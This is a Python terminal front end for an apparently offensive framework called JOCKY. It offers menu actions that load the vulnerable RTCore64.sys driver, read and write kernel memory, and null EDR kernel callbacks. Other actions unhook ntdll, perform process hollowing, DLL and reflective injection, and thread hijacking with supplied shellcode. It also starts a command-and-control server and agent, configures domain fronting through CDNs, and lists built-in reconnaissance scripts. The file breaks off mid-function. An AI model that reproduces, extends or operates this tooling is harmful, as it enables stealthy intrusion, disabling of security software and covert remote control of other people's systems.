#!/usr/bin/env python3
"""
jocky_terminal.py — JOCKY Framework Interactive Terminal

Menu-driven TUI for the JOCKY language compiler, BYOVD engine,
evasion toolkit, C2 management, and forensics.

Run:
    python jocky_terminal.py
"""

import os
import sys
import io
import subprocess
import textwrap
import threading
import platform
from pathlib import Path
from contextlib import redirect_stdout, redirect_stderr

# ── Paths ─────────────────────────────────────────────────────────────────────
APP_DIR       = Path(__file__).parent.resolve()
COMPILER_DIR  = APP_DIR / "compiler"
SCRIPTS_DIR   = APP_DIR / "scripts"
WORKSPACE_DIR = APP_DIR / "workspace"
OUTPUT_DIR    = APP_DIR / "output"
BYOVD_DIR     = APP_DIR / "byovd"
EVASION_DIR   = APP_DIR / "evasion"
C2_DIR        = APP_DIR / "c2"
DOCS_DIR      = APP_DIR / "docs"

for d in [OUTPUT_DIR, WORKSPACE_DIR]:
    d.mkdir(exist_ok=True)

sys.path.insert(0, str(APP_DIR))
sys.path.insert(0, str(COMPILER_DIR))  # must be first — jocky.py in APP_DIR would shadow jocky/ package

# ── Rich ──────────────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.panel   import Panel
    from rich.table   import Table
    from rich.syntax  import Syntax
    from rich.prompt  import Prompt
    from rich.text    import Text
    from rich.rule    import Rule
    from rich.align   import Align
    from rich         import box
    RICH = True
except ImportError:
    RICH = False

console = Console() if RICH else None

IS_WINDOWS = sys.platform == "win32"
IS_LINUX   = sys.platform.startswith("linux")

# ── UI helpers ────────────────────────────────────────────────────────────────

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def pause(msg="Press Enter to continue..."):
    input(f"\n  {msg}")

def cprint(text, style=""):
    if RICH:
        console.print(text, style=style, markup=True)
    else:
        print(text)

def rprint(text):
    if RICH:
        console.print(text, markup=True)
    else:
        import re
        print(re.sub(r'\[/?[^\]]+\]', '', text))

def print_header(title, subtitle=""):
    if RICH:
        console.print()
        inner = f"[bold cyan]{title}[/bold cyan]"
        if subtitle:
            inner += f"\n[dim]{subtitle}[/dim]"
        console.print(Panel(Align.center(Text.from_markup(inner)),
                            border_style="cyan", padding=(1, 4)))
    else:
        print("\n" + "=" * 64)
        print(f"  {title}")
        if subtitle:
            print(f"  {subtitle}")
        print("=" * 64)

def print_section(title):
    if RICH:
        console.print()
        console.print(Rule(f"[bold yellow]{title}[/bold yellow]", style="yellow"))
    else:
        print(f"\n── {title} " + "─" * max(0, 56 - len(title)))

def menu(title, options: list[str], subtitle: str = "") -> str:
    """Display a numbered menu and return the user's choice string."""
    clear()
    print_header(title, subtitle)
    print()
    for i, opt in enumerate(options, 1):
        rprint(f"  [bold white]{i:2d}.[/bold white] {opt}")
    rprint(f"\n  [bold white] 0.[/bold white] [dim]Back / Exit[/dim]")
    print()
    choice = input("  Choose: ").strip()
    return choice

def get_input(prompt: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    val = input(f"  {prompt}{suffix}: ").strip()
    return val or default

def run_and_capture(fn, *args, **kwargs) -> str:
    buf = io.StringIO()
    try:
        with redirect_stdout(buf), redirect_stderr(buf):
            fn(*args, **kwargs)
    except Exception as e:
        buf.write(f"\nERROR: {e}\n")
    return buf.getvalue()

def show_output(text: str, title: str = "Output") -> None:
    print_section(title)
    if RICH:
        console.print(Panel(text.strip() or "(no output)", border_style="dim"))
    else:
        print(text)

# ── Pre-built scripts ─────────────────────────────────────────────────────────

SCRIPTS = [
    ("kernel_recon.jk",        "Kernel reconnaissance — base, callbacks, EDR modules"),
    ("proc_scanner.jk",        "Full process enumeration with PID and name"),
    ("net_monitor.jk",         "Active TCP connection monitoring"),
    ("net_logger.jk",          "Network connection logger"),
    ("byovd_scanner.jk",       "BYOVD vulnerable driver scan (filename + SHA-256)"),
    ("threat_hunter.jk",       "EDR/AV detection via process + kernel callbacks"),
    ("registry_inspector.jk",  "Enumerate kernel drivers from registry / modules"),
    ("sys_info.jk",            "OS version, hostname, architecture fingerprint"),
    ("resource_monitor.jk",    "System resource and process monitor"),
    ("packet_sniffer.jk",      "Network packet sniffer"),
    ("file_hasher.jk",         "File SHA-256 hasher"),
]

def menu_scripts() -> None:
    while True:
        choice = menu("Pre-built Scripts",
                      [f"[cyan]{name}[/cyan] — {desc}" for name, desc in SCRIPTS],
                      "Run a built-in JOCKY reconnaissance script")
        if choice == "0":
            return
        try:
            idx = int(choice) - 1
        except ValueError:
            continue
        if not (0 <= idx < len(SCRIPTS)):
            continue

        script_name, _ = SCRIPTS[idx]
        script_path = SCRIPTS_DIR / script_name
        if not script_path.exists():
            cprint(f"\n  [red]Script not found: {script_path}[/red]")
            pause()
            continue

        _script_action_menu(script_path, script_name)


def _script_action_menu(script_path: Path, script_name: str) -> None:
    """Full per-script action submenu — mirrors the Application's option set."""
    while True:
        choice = menu(
            f"Script: {script_name}",
            [
                "Run (JIT — clean)",
                "Run (JIT + Obfuscation)",
                "Run with Kernel Mode",
                "Build Native Binary",
                "View Source",
                "Show Tokens",
                "Show AST",
                "Show LLVM IR",
                "Pipeline Summary",
            ],
            f"Select action for {script_name}",
        )
        if choice == "0":
            return

        if choice == "1":
            _run_jit(script_path, script_name, obfuscate=False)
        elif choice == "2":
            _run_jit(script_path, script_name, obfuscate=True)
        elif choice == "3":
            _run_kernel_mode(script_path, script_name)
        elif choice == "4":
            _build_native_binary(script_path, script_name)
        elif choice == "5":
            _view_script_source(script_path, script_name)
        elif choice == "6":
            _show_script_tokens(script_path, script_name)
        elif choice == "7":
            _show_script_ast(script_path, script_name)
        elif choice == "8":
            _show_script_ir(script_path, script_name)
        elif choice == "9":
            _show_pipeline_summary(script_path, script_name)


def _run_jit(script_path: Path, script_name: str, obfuscate: bool = False) -> None:
    clear()
    label = "JIT + Obfuscation" if obfuscate else "JIT (clean)"
    print_section(f"{label}: {script_name}")
    try:
        from compiler import compile_jocky
        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
                              run_jit=True, obfuscate_jit=obfuscate)
        show_output(out, f"Result: {script_name}")
    except ImportError as e:
        cprint(f"\n  [red]Compiler import error: {e}[/red]")
    pause()


def _run_kernel_mode(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"Kernel Mode: {script_name}")
    rprint("  [yellow]⚡ KERNEL MODE — JOCKY_KERNEL_MODE=1[/yellow]")
    rprint("  [dim]Kernel operations run with elevated BYOVD context.[/dim]")
    print()
    old_val = os.environ.get("JOCKY_KERNEL_MODE")
    try:
        os.environ["JOCKY_KERNEL_MODE"] = "1"
        from compiler import compile_jocky
        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
                              run_jit=True)
        show_output(out, f"Kernel Result: {script_name}")
    except ImportError as e:
        cprint(f"\n  [red]Compiler import error: {e}[/red]")
    finally:
        if old_val is None:
            os.environ.pop("JOCKY_KERNEL_MODE", None)
        else:
            os.environ["JOCKY_KERNEL_MODE"] = old_val
    pause()


def _build_native_binary(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"Build Native Binary: {script_name}")
    obf = get_input("Obfuscate? (y/n)", "y").lower() == "y"
    emit_ir = get_input("Also emit LLVM IR? (y/n)", "n").lower() == "y"
    try:
        from compiler import compile_jocky
        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
                              obfuscate=obf, emit_ir=emit_ir, run_jit=False)
        show_output(out, f"Build: {script_name}")
    except ImportError as e:
        cprint(f"\n  [red]Compiler import error: {e}[/red]")
    pause()


def _view_script_source(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"Source: {script_name}")
    src = script_path.read_text(encoding="utf-8")
    if RICH:
        console.print(Syntax(src, "c", theme="monokai", line_numbers=True))
    else:
        print(src)
    pause()


def _show_script_tokens(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"Tokens: {script_name}")
    try:
        from jocky.lexer import Lexer
        source = script_path.read_text(encoding="utf-8")
        tokens = Lexer(source).tokenize()
        for t in tokens[:80]:
            rprint(f"  [cyan]{t.type.name:20s}[/cyan]  {repr(t.value)!s:30s}  line {t.line}")
        if len(tokens) > 80:
            rprint(f"  [dim]... {len(tokens)-80} more tokens[/dim]")
        rprint(f"\n  [green]Total: {len(tokens)} tokens[/green]")
    except Exception as e:
        cprint(f"  [red]{e}[/red]")
    pause()


def _show_script_ast(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"AST: {script_name}")
    try:
        sys.path.insert(0, str(COMPILER_DIR))
        from jocky.lexer   import Lexer
        from jocky.parser  import Parser
        source = script_path.read_text(encoding="utf-8")
        tokens = Lexer(source).tokenize()
        ast = Parser(tokens).parse()
        for fn in ast.functions:
            rprint(f"  [bold green]func[/bold green] [yellow]{fn.name}[/yellow]"
                   f"  ({len(fn.params)} params, {len(fn.body.statements)} stmts)")
        rprint(f"\n  [green]{len(ast.functions)} function(s) in AST[/green]")
    except Exception as e:
        cprint(f"  [red]{e}[/red]")
    pause()


def _show_script_ir(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"LLVM IR: {script_name}")
    try:
        sys.path.insert(0, str(COMPILER_DIR))
        from jocky.lexer    import Lexer
        from jocky.parser   import Parser
        from jocky.semantic import SemanticAnalyzer
        from jocky.codegen  import CodeGenerator
        source = script_path.read_text(encoding="utf-8")
        tokens = Lexer(source).tokenize()
        ast    = Parser(tokens).parse()
        SemanticAnalyzer().analyze(ast)
        ir_mod = CodeGenerator(source_name=script_path.stem).generate(ast)
        ir_txt = str(ir_mod)
        if RICH:
            console.print(Syntax(ir_txt[:5000], "llvm", theme="monokai"))
        else:
            print(ir_txt[:5000])
        if len(ir_txt) > 5000:
            rprint(f"  [dim]... {len(ir_txt)-5000} chars truncated[/dim]")
    except Exception as e:
        cprint(f"  [red]{e}[/red]")
    pause()


def _show_pipeline_summary(script_path: Path, script_name: str) -> None:
    clear()
    print_section(f"Pipeline Summary: {script_name}")
    try:
        from compiler import compile_jocky
        out = run_and_capture(compile_jocky, str(script_path), str(OUTPUT_DIR),
                              emit_ir=True, run_jit=False)
        show_output(out, f"Pipeline: {script_name}")
    except ImportError as e:
        cprint(f"\n  [red]Compiler import error: {e}[/red]")
    pause()

# ── Custom editor ─────────────────────────────────────────────────────────────

def menu_editor() -> None:
    workspace_file = WORKSPACE_DIR / "scratch.jk"
    if not workspace_file.exists():
        workspace_file.write_text('func start() {\n    report("Hello from JOCKY!");\n}\n')

    while True:
        choice = menu("Custom Code Editor",
                      ["Edit scratch.jk in $EDITOR / notepad",
                       "Run scratch.jk (JIT)",
                       "Build scratch.jk (native .exe)",
                       "View current source",
                       "Load existing .jk file",
                       "Save as new file"],
                      f"Working file: {workspace_file}")
        if choice == "0":
            return

        if choice == "1":
            editor = os.environ.get("EDITOR", "notepad" if IS_WINDOWS else "nano")
            os.system(f'{editor} "{workspace_file}"')

        elif choice == "2":
            clear()
            print_section("JIT execution")
            try:
                from compiler import compile_jocky
                out = run_and_capture(compile_jocky, str(workspace_file),
                                      str(OUTPUT_DIR), run_jit=True)
                show_output(out)
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "3":
            clear()
            print_section("Build native exe")
            emit_ir = get_input("Also emit LLVM IR? (y/n)", "n").lower() == "y"
            try:
                from compiler import compile_jocky
                out = run_and_capture(compile_jocky, str(workspace_file),
                                      str(OUTPUT_DIR), emit_ir=emit_ir, run_jit=False)
                show_output(out)
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "4":
            clear()
            print_section("Source")
            src = workspace_file.read_text(encoding="utf-8")
            if RICH:
                console.print(Syntax(src, "c", theme="monokai", line_numbers=True))
            else:
                print(src)
            pause()

        elif choice == "5":
            path = get_input("Path to .jk file")
            p = Path(path)
            if p.exists():
                workspace_file = p
                cprint(f"  [green]Loaded: {p}[/green]")
            else:
                cprint(f"  [red]Not found: {p}[/red]")
            pause()

        elif choice == "6":
            name = get_input("Save as (filename, no extension)")
            if name:
                dest = WORKSPACE_DIR / (name + ".jk")
                dest.write_bytes(workspace_file.read_bytes())
                cprint(f"  [green]Saved to {dest}[/green]")
            pause()

# ── Pipeline inspector ────────────────────────────────────────────────────────

def menu_inspector() -> None:
    while True:
        choice = menu("Pipeline Inspector",
                      ["Tokenise (Lexer)",
                       "Parse (AST)",
                       "Semantic check",
                       "Emit LLVM IR",
                       "Full pipeline trace"],
                      "Inspect each stage of JOCKY compilation")
        if choice == "0":
            return

        path = get_input("Source file", str(WORKSPACE_DIR / "scratch.jk"))
        src_path = Path(path)
        if not src_path.exists():
            cprint(f"  [red]File not found[/red]")
            pause()
            continue

        try:
            source = src_path.read_text(encoding="utf-8")
            from jocky.lexer    import Lexer
            from jocky.parser   import Parser
            from jocky.semantic import SemanticAnalyzer
            from jocky.codegen  import CodeGenerator
        except ImportError as e:
            cprint(f"  [red]Import error: {e}[/red]")
            pause()
            continue

        clear()
        if choice == "1":
            print_section("Tokens")
            tokens = Lexer(source).tokenize()
            for t in tokens[:80]:
                rprint(f"  [cyan]{t.type.name:20s}[/cyan]  {repr(t.value)!s:30s}  line {t.line}")
            if len(tokens) > 80:
                rprint(f"  [dim]... {len(tokens)-80} more tokens[/dim]")

        elif choice == "2":
            print_section("AST")
            tokens = Lexer(source).tokenize()
            try:
                ast = Parser(tokens).parse()
                for fn in ast.functions:
                    rprint(f"  [bold green]func[/bold green] [yellow]{fn.name}[/yellow]  ({len(fn.params)} params, {len(fn.body.statements)} stmts)")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")

        elif choice == "3":
            print_section("Semantic")
            tokens = Lexer(source).tokenize()
            try:
                ast = Parser(tokens).parse()
                SemanticAnalyzer().analyze(ast)
                cprint("  [green]OK — no type errors[/green]")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")

        elif choice == "4":
            print_section("LLVM IR")
            tokens = Lexer(source).tokenize()
            try:
                ast = Parser(tokens).parse()
                SemanticAnalyzer().analyze(ast)
                ir_module = CodeGenerator(source_name=src_path.stem).generate(ast)
                ir_text = str(ir_module)
                if RICH:
                    console.print(Syntax(ir_text[:4000], "llvm", theme="monokai"))
                else:
                    print(ir_text[:4000])
                if len(ir_text) > 4000:
                    rprint(f"\n  [dim]... {len(ir_text)-4000} chars truncated[/dim]")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")

        elif choice == "5":
            print_section("Full Pipeline Trace")
            try:
                from compiler import compile_jocky
                out = run_and_capture(compile_jocky, str(src_path),
                                      str(OUTPUT_DIR), emit_ir=True, run_jit=False)
                show_output(out)
            except Exception as e:
                cprint(f"  [red]{e}[/red]")

        pause()

# ── Build ─────────────────────────────────────────────────────────────────────

def menu_build() -> None:
    while True:
        choice = menu("Build",
                      ["Compile .jk to native .exe (full pipeline)",
                       "JIT run .jk",
                       "Batch compile all .jk in scripts/",
                       "Show last build output",
                       "Open output/ folder"])
        if choice == "0":
            return

        if choice == "1":
            path = get_input("Source .jk file")
            src = Path(path)
            if not src.exists():
                cprint("  [red]File not found[/red]"); pause(); continue
            obf = get_input("Obfuscate? (y/n)", "y").lower() == "y"
            clear()
            try:
                from compiler import compile_jocky
                out = run_and_capture(compile_jocky, str(src), str(OUTPUT_DIR),
                                      obfuscate=obf, run_jit=False)
                show_output(out)
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "2":
            path = get_input("Source .jk file")
            src = Path(path)
            if not src.exists():
                cprint("  [red]File not found[/red]"); pause(); continue
            clear()
            try:
                from compiler import compile_jocky
                out = run_and_capture(compile_jocky, str(src), str(OUTPUT_DIR), run_jit=True)
                show_output(out)
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "3":
            clear()
            print_section("Batch compile")
            jk_files = list(SCRIPTS_DIR.glob("*.jk"))
            cprint(f"  Found {len(jk_files)} scripts")
            try:
                from compiler import compile_jocky
                for f in jk_files:
                    out = run_and_capture(compile_jocky, str(f), str(OUTPUT_DIR), run_jit=False)
                    status = "[green]OK[/green]" if "Executable" in out or "SHA-256" in out else "[red]FAIL[/red]"
                    rprint(f"  {status}  {f.name}")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "4":
            logs = list(OUTPUT_DIR.glob("*.ll")) + list(OUTPUT_DIR.glob("*.exe"))
            if not logs:
                cprint("  [dim]No output files yet[/dim]")
            else:
                for f in sorted(logs):
                    rprint(f"  [cyan]{f.name}[/cyan]  {f.stat().st_size//1024} KB")
            pause()

        elif choice == "5":
            if IS_WINDOWS:
                os.startfile(str(OUTPUT_DIR))
            else:
                subprocess.Popen(["xdg-open", str(OUTPUT_DIR)])

# ── BYOVD Engine ──────────────────────────────────────────────────────────────

def menu_byovd() -> None:
    while True:
        choice = menu("BYOVD Engine",
                      ["Scan for vulnerable drivers (LOLDrivers DB, SHA-256 cross-ref)",
                       "Load RTCore64.sys driver",
                       "Get kernel base address",
                       "Enumerate kernel callbacks (process/thread/image)",
                       "Read kernel memory",
                       "Write kernel memory",
                       "Attempt callback blind (EDR suppress)"],
                      f"Platform: {platform.system()} | DB: loldrivers.json (40+ entries)")
        if choice == "0":
            return

        if choice == "1":
            clear()
            print_section("BYOVD Vulnerable Driver Scan")
            try:
                from byovd.scanner import DriverScanner
                scanner = DriverScanner()
                rprint(f"  [cyan]LOLDrivers DB: {scanner.db_entry_count()} entries[/cyan]")
                rprint(f"  [dim]Using SHA-256 cross-reference + filename fallback[/dim]\n")
                findings = scanner.scan()
                if not findings:
                    cprint("  [green]No vulnerable drivers found on this system[/green]")
                else:
                    for f in findings:
                        e = f['entry']
                        color = "red" if f['score'] >= 8 else "yellow" if f['score'] >= 6 else "white"
                        rprint(f"  [{color}][{f['risk']}][/{color}]  {f['name']}")
                        rprint(f"         CVE  : [cyan]{e.get('CVE','N/A')}[/cyan]")
                        rprint(f"         Tags : {', '.join(e.get('Tags',[]))}")
                        rprint(f"         Match: [dim]{f['match']}[/dim]")
                        rprint(f"         SHA  : [dim]{f['sha256']}[/dim]")
                        print()
            except ImportError as e:
                cprint(f"  [red]Import error: {e}[/red]")
            pause()

        elif choice in ("2", "3", "4", "5", "6", "7"):
            _byovd_kernel_action(choice)

def _byovd_kernel_action(choice: str) -> None:
    clear()
    try:
        from byovd.kernel import KernelInterface
    except ImportError as e:
        cprint(f"\n  [red]Import error: {e}[/red]")
        pause()
        return

    simulate = not IS_WINDOWS
    if IS_WINDOWS:
        ans = get_input("Use simulation mode? (y/n)", "n")
        simulate = ans.lower() == "y"

    ki = KernelInterface(simulate=simulate)

    if choice == "2":
        print_section("Load Driver")
        if simulate:
            cprint("  [yellow][SIM] RTCore64.sys loaded (simulated)[/yellow]")
        else:
            try:
                from byovd.loader import DriverLoader
                drv_path = get_input("Driver path", str(APP_DIR / "byovd" / "RTCore64.sys"))
                dl = DriverLoader(drv_path, simulate=False)
                ok = dl.load()
                cprint(f"  {'[green]Loaded[/green]' if ok else '[red]Failed[/red]'}")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")

    elif choice == "3":
        print_section("Kernel Base")
        base = ki.get_kernel_base()
        if base:
            rprint(f"  [bold green]ntoskrnl.exe base: 0x{base:016X}[/bold green]")
        else:
            cprint("  [red]Failed to resolve kernel base (HVCI/VBS may be active)[/red]")

    elif choice == "4":
        print_section("Kernel Callbacks")
        cbs = ki.enum_process_callbacks()
        if not cbs:
            cprint("  [dim]No callbacks found (driver may need loading first)[/dim]")
        else:
            for cb in cbs:
                ms = cb.get('is_microsoft', True)
                color = "dim" if ms else "red bold"
                tag   = "[MS]" if ms else "[EDR]"
                rprint(f"  [{color}]{tag}[/{color}]  0x{cb['address']:016X}  {cb.get('module','?')}")

    elif choice == "5":
        print_section("Read Kernel Memory")
        addr_str = get_input("Address (hex, e.g. 0xFFFFF80000000000)")
        size_str = get_input("Size (bytes)", "8")
        try:
            addr = int(addr_str, 16)
            size = int(size_str)
            data = ki.read_memory(addr, size)
            rprint(f"  Data: [cyan]{data.hex() if data else 'none'}[/cyan]")
        except Exception as e:
            cprint(f"  [red]{e}[/red]")

    elif choice == "6":
        print_section("Write Kernel Memory")
        cprint("  [yellow]WARNING: Kernel writes can crash the system. Continue?[/yellow]")
        if get_input("Confirm (yes/no)", "no").lower() != "yes":
            return
        addr_str = get_input("Address (hex)")
        val_str  = get_input("Hex bytes (e.g. 9090)")
        try:
            addr = int(addr_str, 16)
            data = bytes.fromhex(val_str)
            ki.write_memory(addr, data)
            cprint("  [green]Write dispatched[/green]")
        except Exception as e:
            cprint(f"  [red]{e}[/red]")

    elif choice == "7":
        print_section("Callback Blind")
        cbs = ki.enum_process_callbacks()
        edr_cbs = [c for c in cbs if not c.get('is_microsoft', True)]
        if not edr_cbs:
            cprint("  [green]No non-Microsoft callbacks found[/green]")
        else:
            rprint(f"  [yellow]{len(edr_cbs)} EDR callback(s) detected[/yellow]")
            for cb in edr_cbs:
                rprint(f"    0x{cb['address']:016X}  {cb.get('module','?')}")
            if not simulate:
                ans = get_input("Attempt to null these callbacks? (yes/no)", "no")
                if ans.lower() == "yes":
                    ki.blind_callbacks(edr_cbs)
                    cprint("  [green]Blind attempted[/green]")
            else:
                cprint("  [dim][SIM] Would null these in real mode[/dim]")

    pause()

# ── Evasion Engine ────────────────────────────────────────────────────────────

def menu_evasion() -> None:
    if not IS_WINDOWS:
        cprint("\n  [yellow]Evasion Engine is Windows-only (requires kernel APIs)[/yellow]")
        pause()
        return

    while True:
        choice = menu("Evasion Engine",
                      ["API Unhooking — restore EDR hooks in ntdll.dll",
                       "Direct Syscalls — dump SSN table (bypass ntdll)",
                       "Process Hollowing — hollow host process with payload",
                       "DLL Injection — inject DLL via LoadLibraryW",
                       "Reflective DLL Injection",
                       "Thread Hijacking — redirect thread RIP"],
                      "Windows kernel-level evasion techniques")
        if choice == "0":
            return

        if choice == "1":
            clear()
            print_section("API Unhooking")
            try:
                from evasion.api_unhook import ApiUnhooker
                dll = get_input("Target DLL", "ntdll.dll")
                import os as _os
                dll_path = _os.path.join(_os.environ.get("WINDIR","C:\\Windows"), "System32", dll)
                u = ApiUnhooker(dll_path)
                hooks = u.audit()
                if not hooks:
                    cprint(f"  [green]{dll} is clean — no hooks detected[/green]")
                else:
                    rprint(f"  [red]{len(hooks)} hook(s) detected[/red]")
                    for h in hooks:
                        rprint(f"    [yellow]{h['function']}[/yellow]  @ 0x{h['mem_addr']:016X}")
                    if get_input("Restore all hooks? (yes/no)", "no").lower() == "yes":
                        u.unhook(hooks)
                        cprint("  [green]Hooks restored[/green]")
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "2":
            clear()
            print_section("Direct Syscall SSN Table")
            try:
                from evasion.syscall import DirectSyscall
                sc = DirectSyscall()
                table = sc.dump_ssns()
                rprint(f"  [cyan]{len(table)} Nt/Zw syscalls found[/cyan]\n")
                for name, ssn in sorted(table.items(), key=lambda x: x[1])[:40]:
                    rprint(f"  [dim]SSN 0x{ssn:04X}[/dim]  [white]{name}[/white]")
                if len(table) > 40:
                    rprint(f"  [dim]... {len(table)-40} more[/dim]")
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "3":
            clear()
            print_section("Process Hollowing")
            host    = get_input("Host exe (victim)", r"C:\Windows\System32\notepad.exe")
            payload = get_input("Payload exe (PE to inject)")
            if not Path(payload).exists():
                cprint("  [red]Payload not found[/red]")
            else:
                try:
                    from evasion.hollow import hollow
                    pid = hollow(host, payload)
                    rprint(f"  [green]Hollowed PID: {pid}[/green]")
                except Exception as e:
                    cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "4":
            clear()
            print_section("DLL Injection (LoadLibraryW)")
            pid = get_input("Target PID")
            dll = get_input("DLL path")
            try:
                from evasion.inject import loadlibrary_inject
                hthread = loadlibrary_inject(int(pid), dll)
                rprint(f"  [green]Thread: 0x{hthread:X}[/green]")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "5":
            clear()
            print_section("Reflective DLL Injection")
            pid = get_input("Target PID")
            dll = get_input("Reflective DLL path")
            try:
                from evasion.inject import reflective_inject
                hthread = reflective_inject(int(pid), dll)
                rprint(f"  [green]Thread: 0x{hthread:X}[/green]")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

        elif choice == "6":
            clear()
            print_section("Thread Hijacking")
            pid      = get_input("Target PID")
            sc_hex   = get_input("Shellcode (hex bytes, e.g. 9090C3)")
            try:
                from evasion.thread_hijack import hijack_thread
                sc = bytes.fromhex(sc_hex)
                result = hijack_thread(int(pid), sc)
                rprint(f"  [green]TID {result['tid']}: RIP {result['original_rip']:016X} -> {result['new_rip']:016X}[/green]")
            except Exception as e:
                cprint(f"  [red]{e}[/red]")
            pause()

# ── C2 Management ─────────────────────────────────────────────────────────────

def menu_c2() -> None:
    while True:
        choice = menu("C2 Management",
                      ["Start C2 Server (local)",
                       "Connect as Agent to server",
                       "Domain Fronting config + test",
                       "Show C2 architecture info"],
                      "Command-and-control: server, agent, CDN fronting")
        if choice == "0":
            return

        if choice == "1":
            clear()
            print_section("C2 Server")
            host = get_input("Bind address", "0.0.0.0")
            port = get_input("Port", "4444")
            cprint(f"\n  [cyan]Starting C2 server on {host}:{port}[/cyan]")
            cprint("  [dim]Type 'list', 'exec <sid> <code>', 'execall <code>', 'quit'[/dim]\n")
            try:
                import asyncio
                from c2.server import C2Server
                async def _run():
                    srv = C2Server(host, int(port))
                    await srv.start()
                    await srv.interactive_loop()
                asyncio.run(_run())
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            except KeyboardInterrupt:
                cprint("\n  [yellow]Server stopped[/yellow]")
            pause()

        elif choice == "2":
            clear()
            print_section("C2 Agent")
            host = get_input("Server address", "127.0.0.1")
            port = get_input("Port", "4444")
            tls  = get_input("Use TLS? (y/n)", "n").lower() == "y"
            cprint(f"\n  [cyan]Connecting to {host}:{port} …[/cyan]")
            try:
                import asyncio
                from c2.agent import C2Agent
                agent = C2Agent(host, int(port), tls=tls, reconnect=False)
                asyncio.run(agent.run())
            except ImportError as e:
                cprint(f"  [red]{e}[/red]")
            except KeyboardInterrupt:
                pass
            pause()

        elif choice == "3":
            clear()
            print_section("Domain Fronting")
            rprint("  [bold]Domain fronting routes C2 traffic through CDN infrastructure.[/bold]")
            rprint("  [dim]Network sees: <CDN front domain> (legitimate)")
            rprint("  HTTP Host header: <real C2 host> (encrypted in TLS)[/dim]\n")
            c2_host = get_input("Real C2 host (Host: header)")
            cdn     = get_input("CDN front domain (SNI/TCP, e.g. *.cloudfront.net)")
            path    = get_input("HTTP path", "/jocky")
            proxy   = get_input("SOCKS5 proxy (host:port, blank=none)", "")
            if not c2_host:
                pause()
                continue
            proxy_host, proxy_port = None, 1080
            if proxy:
                parts = proxy.rsplit(":", 1)
                proxy_host = parts[0]
                proxy_port = int(parts[1]) if len(parts) > 1 else 1080

            cprint(f"\n  [cyan]Config:[/cyan]")
            rprint(f"    C2 host  : [white]{c2_host}[/white]")
            rprint(f"    CDN front: [white]{cdn or c2_host}[/white]")
            rprint(f"    Path     : [white]{path}[/white]")
            rprint(f"    SOCKS5   : [white]{proxy or 'none'}[/white]")
            cprint("\n  [dim]Use fronting.FrontedTransport in your agent for actual traffic.[/dim]")
            pause()

        elif choice == "4":
            clear()
            print_section("C2 Architecture")
            rprint("""
  [bold cyan]JOCKY C2 Architecture[/bold cyan]

  [yellow]Server (c2/server.py)[/yellow]
    • Asyncio TCP listener (supports TLS)
    • Multi-agent sessions — each agent gets a unique SID
    • Management shell: list, exec, execall
    • Dispatches JOCKY scripts to agents for remote execution

  [yellow]Agent (c2/agent.py)[/yellow]
    • Connects to server, auto-reconnects on drop
    • Heartbeat ping every 30s
    • Executes .jk scripts or raw JOCKY code on command
    • Reports output back to server

  [yellow]Domain Fronting (c2/fronting.py)[/yellow]
    • HTTP POST/GET with spoofed Host: header
    • TLS SNI = CDN front domain (what the network sees)
    • HTTP Host = real C2 hostname (inside encrypted TLS)
    • Optional SOCKS5 proxy for double-hop routing
    • FrontedBeacon for periodic polling C2

  [yellow]CDN Fronting Examples[/yellow]
    • AWS CloudFront: *.cloudfront.net → custom origin
    • Azure CDN: *.azureedge.net      → custom origin
    • Fastly: *.fastly.net            → backend host
""")
            pause()

# ── Language Reference ────────────────────────────────────────────────────────

def menu_langref() -> None:
    ref = """
JOCKY Language Reference
─────────────────────────

Types:     int, string, bool, proc, conn, mem
Literals:  42  "hello"  true  false  0xDEADBEEF

Functions:
  func start() { ... }          Entry point
  func name(param: type) { ... }

Variables:
  let x: int = 42;
  let s: string = "hello";

Control flow:
  if (cond) { ... } else { ... }
  for (let i: int = 0; i < n; i++) { ... }
  while (cond) { ... }

Operators:  + - * / % == != < > <= >= && || !

Stdlib — Output:
  report(s: string)

Stdlib — Processes:
  procs_list() -> proc
  proc_count(p: proc) -> int
  proc_name(p: proc, i: int) -> string
  proc_pid(p: proc, i: int) -> int
  proc_kill(pid: int)

Stdlib — Network:
  conns_list() -> conn
  conn_count(c: conn) -> int
  conn_local(c: conn, i: int) -> string
  conn_remote(c: conn, i: int) -> string
  conn_pid(c: conn, i: int) -> int

Stdlib — BYOVD / Kernel:
  byovd_scan() -> mem        Scan drivers (SHA-256 + filename)
  byovd_count(m: mem) -> int
  byovd_name(m: mem, i: int) -> string
  byovd_cve(m: mem, i: int) -> string
  byovd_hash(m: mem, i: int) -> string
  kernel_base() -> int
  registry_scan() -> mem
  reg_count(m: mem) -> int
  reg_name(m: mem, i: int) -> string

Stdlib — System:
  system_info() -> string

Example:
  func start() {
      let p: proc = procs_list();
      let n: int = proc_count(p);
      for (let i: int = 0; i < n; i++) {
          report(proc_name(p, i));
      }
  }

Full docs: docs/jockydocumentation.md
"""
    clear()
    print_header("JOCKY Language Reference")
    if RICH:
